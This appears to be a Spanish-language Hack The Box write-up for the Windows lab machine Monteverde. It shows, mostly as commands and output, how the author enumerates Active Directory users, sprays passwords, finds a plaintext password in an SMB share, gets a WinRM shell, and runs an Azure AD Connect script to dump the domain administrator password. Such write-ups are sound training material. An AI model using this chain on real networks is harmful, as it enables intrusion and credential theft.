---
title: Hack The Box Monteverde
author: k4miyo
date: 2022-01-15
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Windows]
tags: [Windows, Active Directory, Powershell, File Misconfiguration]
ping: true
---

## Monteverde
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.172.

```bash
❯ ping -c 1 10.10.10.172
PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.172 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.923/136.923/136.923/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 16:52 CST
Initiating SYN Stealth Scan at 16:52        
Scanning 10.10.10.172 [65535 ports]          
Discovered open port 53/tcp on 10.10.10.172   
Discovered open port 139/tcp on 10.10.10.172  
Discovered open port 445/tcp on 10.10.10.172  
Discovered open port 135/tcp on 10.10.10.172  
Discovered open port 636/tcp on 10.10.10.172 
Discovered open port 3268/tcp on 10.10.10.172
Discovered open port 49674/tcp on 10.10.10.172
Discovered open port 49673/tcp on 10.10.10.172
Discovered open port 49693/tcp on 10.10.10.172
Discovered open port 49676/tcp on 10.10.10.172
Discovered open port 9389/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172
Discovered open port 49667/tcp on 10.10.10.172                                                                                   
Discovered open port 5985/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172  
Discovered open port 3269/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172      
Discovered open port 464/tcp on 10.10.10.172                                                                                     
Completed SYN Stealth Scan at 16:52, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.172               
Host is up, received user-set (0.14s latency).  
Scanned at 2022-01-15 16:52:04 CST for 27s      
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 30 (1.320KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.172
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 10.10.10.172 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 16:53 CST
Nmap scan report for 10.10.10.172
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-15 22:53:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-01-15T22:54:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.32 seconds
```

Vemos el puerto 445 abierto, así que trataremos de conectarnos a través de una ***Null Session***:

```bash
❯ smbclient -L 10.10.10.172 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.172 -u 'null'
[!] Authentication error on 10.10.10.172
❯ smbmap -H 10.10.10.172 -u ''
[+] IP: 10.10.10.172:445        Name: 10.10.10.172
```

No vemos nada interesante, así que ahora vamos a tratar de ocupar `rpcclient` para ver si podemos conectarnos.

```bash
❯ rpcclient -U '' 10.10.10.172 -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $>
```

Tenemos la capacidad de obtener información de **Active Directory** y para facilitarnos las cosas, haremos uso de la herramienta [rpcenum](https://github.com/s4vitar/rpcenum) para dumpear la información que nos interesa.

```bash
❯ rpcenum

[*] Uso: rpcenum

        e) Enumeration Mode

                DUsers (Domain Users)
                DUsersInfo (Domain Users with info)
                DAUsers (Domain Admin Users)
                DGroups (Domain Groups)
                All (All Modes)

        i) Host IP Address

        h) Show this help pannel
```

- Domain Users

```bash
❯ rpcenum -e DUsers -i 10.10.10.172

[*] Enumerating Domain Users...

  +                   +
  | Users             |
  +                   +
  | Guest             |
  | AAD_987d7f2f57d2  |
  | mhope             |
  | SABatchJobs       |
  | svc-ata           |
  | svc-bexec         |
  | svc-netapp        |
  | dgalanos          |
  | roleary           |
  | smorgan           |
  +                   +
```

- Domain Users with info

```bash
❯ rpcenum -e DUsersInfo -i 10.10.10.172

[*] Listing domain users with description...

  +                   +                                                                                                                                                    +
  | User              | Description                                                                                                                                        |
  +                   +                                                                                                                                                    +
  | Guest             | Built-in account for guest access to the computer/domain                                                                                           |
  | AAD_987d7f2f57d2  | Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.  |
  +                   +                                                                                                                                                    +
```

- Domain Admin Users

```bash
❯ rpcenum -e DAUsers -i 10.10.10.172

[*] Enumerating Domain Admin Users...

  +                   +
  | DomainAdminUsers  |
  +                   +
```

- Domain Groups

```bash
❯ rpcenum -e DGroups -i 10.10.10.172

[*] Enumerating Domain Groups...

  +                                          +                                                                                                                   +
  | DomainGroup                              | Description                                                                                                       |
  +                                          +                                                                                                                   +
  | Enterprise Read-only Domain Controllers  | Members of this group are Read-Only Domain Controllers in the enterprise                                          |
  | Domain Users                             | All domain users                                                                                                  |
  | Domain Guests                            | All domain guests                                                                                                 |
  | Domain Computers                         | All workstations and servers joined to the domain                                                                 |
  | Group Policy Creator Owners              | Members in this group can modify group policy for the domain                                                      |
  | Cloneable Domain Controllers             | Members of this group that are domain controllers may be cloned.                                                  |
  | Protected Users                          | Members of this group are afforded additional protections against authentication security threats. See http       |
  | DnsUpdateProxy                           | DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).  |
  | Azure Admins                             |                                                                                                                   |
  | File Server Admins                       |                                                                                                                   |
  | Call Recording Admins                    |                                                                                                                   |
  | Reception                                |                                                                                                                   |
  | Operations                               |                                                                                                                   |
  | Trading                                  |                                                                                                                   |
  | HelpDesk                                 |                                                                                                                   |
  | Developers                               |                                                                                                                   |
  +                                          +                                                                                                                   +
```

Con la información que tenemos, ya debemos ver un grupo del cual podriamos abusar **Azure Admins** ya que como buen atacante vamos a ir por la administración del dominio y comprometer los equipos; por lo tanto, vamos a ver que usuarios pertenecen a dicho grupo.

```bash
❯ rpcclient -U '' 10.10.10.172 -N
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
rpcclient $>
rpcclient $> querygroupmem 0xa29
        rid:[0x1f4] attr:[0x7]
        rid:[0x450] attr:[0x7]
        rid:[0x641] attr:[0x7]
rpcclient $>
rpcclient $> queryuser 0x1f4                                                                                                     
result was NT_STATUS_ACCESS_DENIED                                                                                               
rpcclient $>
rpcclient $> queryuser 0x450                                                                                                     
        User Name   :   AAD_987d7f2f57d2                                                                                         
        Full Name   :   AAD_987d7f2f57d2                                                                                         
        Home Drive  :                                                                                                            
        Dir Drive   :      
        Profile Path:        
        Logon Script:        
        Description :   Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309a
dfc172d9 running on computer MONTEVERDE.
        Workstations:      
        Comment     :                                           
        Remote Dial :                                           
        Logon Time               :      sáb, 15 ene 2022 16:53:30 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
        Password last set Time   :      jue, 02 ene 2020 16:53:25 CST
        Password can change Time :      vie, 03 ene 2020 16:53:25 CST
        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000a
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $>
rpcclient $> queryuser 0x641
        User Name   :   mhope
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      vie, 03 ene 2020 07:29:59 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 13 sep 30828 21:48:05 CDT
        Password last set Time   :      jue, 02 ene 2020 17:40:06 CST
        Password can change Time :      vie, 03 ene 2020 17:40:06 CST
        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 
```

Vemos tres usuarios de los cuales podemos ver la información de dos: **AAD_987d7f2f57d2** y **mhope**. Como no tenemos nada más, vamos a extraer todos los usuarios y con ayuda de `crackmapexec smb` vamos a validar si dentro de los usuarios podrian ser contraseñas.

```bash
❯ rpcclient -U '' 10.10.10.172 -c "enumdomusers" -N | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
❯ rpcclient -U '' 10.10.10.172 -c "enumdomusers" -N | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > ../content/domainUsers.txt
❯ crackmapexec smb 10.10.10.172 -u domainUsers.txt -p domainUsers.txt
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Vemos que tenemos credenciales de un usuario `SABatchJobs : SABatchJobs`, así que como siempre, vamos a guardarlas y validar que recursos nos aparecen sobre SMB.

```bash
❯ smbclient -L 10.10.10.172 -U 'SABatchJobs'
Enter WORKGROUP\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```

Vemos varios recursos a los cuales tenemos acceso, podríamos buscar en **SYSVOL** el archivo **Groups.xml**; sin embargo, no hay nada. En **azure_uploads** tampoco vemos nada, así que vamos a **users$** y crearnos una montura.

```bash
❯ mkdir /mnt/smbmounted
❯ mount -t cifs //10.10.10.172/users$ /mnt/smbmounted/ -o username=SABatchJobs,password=SABatchJobs,domain=WORKGROUP,rw
❯ cd /mnt/smbmounted
❯ tree
.
├── dgalanos
├── mhope
│   └── azure.xml
├── roleary
└── smorgan

4 directories, 1 file
```

Vemos un archivo `azure.xml`, así que vamos a traerlo a nuestra máquina.

```bash
❯ cd /home/k4miyo/Documentos/HTB/Monteverde/content
❯ cp /mnt/smbmounted/mhope/azure.xml .
❯ cat azure.xml
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: azure.xml   <UTF-16LE>
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ﻿<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
   2   │   <Obj RefId="0">
   3   │     <TN RefId="0">
   4   │       <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
   5   │       <T>System.Object</T>
   6   │     </TN>
   7   │     <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
   8   │     <Props>
   9   │       <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
  10   │       <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
  11   │       <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
  12   │       <S N="Password">4n0therD4y@n0th3r$</S>
  13   │     </Props>
  14   │   </Obj>
  15   │ </Objs>
```

Aqui vemos una contraseña posiblemente asociada al usario **mhope**, así que vamos a validarla.

```bash
❯ crackmapexec smb 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

Son válidas las credenciales que tenemos y a parte son de un usuario que se encuentra dentro del grupo **Azure Admins** que es lo que estábamos buscando. Regresando un poco a la captura que `nmap`, vemos que se encuentra abierto el puerto 5985, por lo que podríamos tratar de conectarnos a la máquina con `evil-winrm` y las credenciales que tenemos:

```bash
❯ evil-winrm -u 'mhope' -p '4n0therD4y@n0th3r$' -i 10.10.10.172

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

Ya nos encontramos dentro de la máquina como el usuario **mhope** y podemos visualizar la flag (user.txt). Ahora, recordando que dicho usuario se encuentra dentro del grupo de dominio **Azure Admins**, vamos a echarle un ojo.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/15/2022 5:57:03 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\mhope\Documents>
*Evil-WinRM* PS C:\Users\mhope\Documents> net group "Azure Admins"
Group name     Azure Admins
Comment

Members

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            mhope
The command completed successfully.

*Evil-WinRM* PS C:\Users\mhope\Documents>
```

Vemos que el otro usuario que no podíamos ver que se encuentra dentro de dicho grupo es **Administrator**, vamos a echarle un ojo.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> net user Administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 2:18:38 PM
Password expires             Never
Password changeable          1/3/2020 2:18:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/15/2022 6:21:49 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *ADSyncAdmins
Global Group memberships     *Domain Admins        *Azure Admins
                             *Group Policy Creator *Domain Users
                             *Enterprise Admins    *Schema Admins
The command completed successfully.

*Evil-WinRM* PS C:\Users\mhope\Documents>
*Evil-WinRM* PS C:\Users\mhope\Documents> net group "Domain Admins"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

*Evil-WinRM* PS C:\Users\mhope\Documents>
```

El usuario **Administrator** es el único que pertenece al grupo **Domain Admins**, por lo tanto, vamos a buscar un exploit que nos ayude a escalar privilegios dentro de **Azure Admins** y encontramos un recurso en internet [Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1), así que lo descargamo.

```bash
❯ wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
--2022-01-15 19:28:27--  https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2264 (2.2K) [text/plain]
Grabando a: «Azure-ADConnect.ps1»

Azure-ADConnect.ps1              100%[=======================================================>]   2.21K  --.-KB/s    en 0s      

2022-01-15 19:28:27 (48.3 MB/s) - «Azure-ADConnect.ps1» guardado [2264/2264]
```

Ahora lo pasamos a la máquina víctima en un diretorio donde tengamos permisos:

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Privesc


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/15/2022   6:29 PM                Privesc


*Evil-WinRM* PS C:\Windows\Temp> cd Privesc
*Evil-WinRM* PS C:\Windows\Temp\Privesc> upload Azure-ADConnect.ps1
Info: Uploading Azure-ADConnect.ps1 to C:\Windows\Temp\Privesc\Azure-ADConnect.ps1

                                                             
Data: 3016 bytes of 3016 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\Temp\Privesc> dir


    Directory: C:\Windows\Temp\Privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/15/2022   6:30 PM           2264 Azure-ADConnect.ps1


*Evil-WinRM* PS C:\Windows\Temp\Privesc>
```

Ahora importamos el módulo y ejecutamos la función correspondiente.

```bash
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Import-Module .\Azure-ADConnect.ps1
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Azure-ADConnect -server 10.10.10.172 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
*Evil-WinRM* PS C:\Windows\Temp\Privesc>
```

Tenemos la contraseña del usuario **Administrator** y como siempre, vamos a guardar las credenciales y validar con `crackmapexec`.

```bash
❯ crackmapexec smb 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
```

Son válidas, asi que ahora podemos conectarnos a la máquina ya como el usuario **Administartor**:

```bash
❯ evil-winrm -u 'administrator' -p 'd0m@in4dminyeah!' -i 10.10.10.172

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Ya podemos visualizar la flag (root.txt).
